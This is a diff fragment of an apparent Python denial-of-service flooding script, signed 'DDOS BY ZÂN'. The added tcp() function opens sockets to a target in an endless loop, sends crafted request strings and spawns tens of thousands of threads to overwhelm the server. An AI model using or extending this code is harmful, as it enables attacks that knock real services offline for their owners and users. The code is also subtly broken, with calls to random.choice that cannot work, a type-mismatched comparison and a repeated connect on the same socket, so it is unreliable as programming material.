@@ -159,12 +159,38 @@ def start():
             for vr in range(pack):
              s.connect((ip,port))
              s.send((main_req))
-             print("nice")
+             print("[!] DDOS BY ZÂN [!]")
         except:
           s.close()
           print('[+] server error')
-          
-  for lol in range(th):
-    if lol == "gitudoangbabi":
-     thred = threading.Thread(target=start)
-     thred.start()
+  def tcp():
+    global useragents, socks3
+    data = random._urandom(7000)
+    data2 = random.choice("[#]","[!]","[?]")
+    useragen = "UserAgents: "+random.choice+"\r\n"
+    sock7 = "Sockets: "+random.choice+(socks3)+"\r\n"
+    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+    post_host = "POST /Attacked-by-HAHA HTTP/1.1\r\nHost: " + ip + "\r\n"
+    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+    main_req = useragen + sock7 + get_host + post_host + get_data + "\r\n"
+    while True:
+          try:
+             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+             s.connect((str(ip),int(port)))
+             s.send(str.encode(main_req))
+             for i in range(pack):
+               s.connect((str(ip),int(port)))
+               s.send(str.encode(main_req))
+               print("[!] DDOS BY ZÂN [!]")
+          except:
+             s.close()
+             print('[+] server error')
+    for kntl in range(th):
+      if kntl == 'bego':
+       thred = threading.Thread(target=start)
+       thred.start()
+      else:
+       for kntl in range(76000):
+        thred2  = threading.Thread(target=tcp)
+        thred2.start()
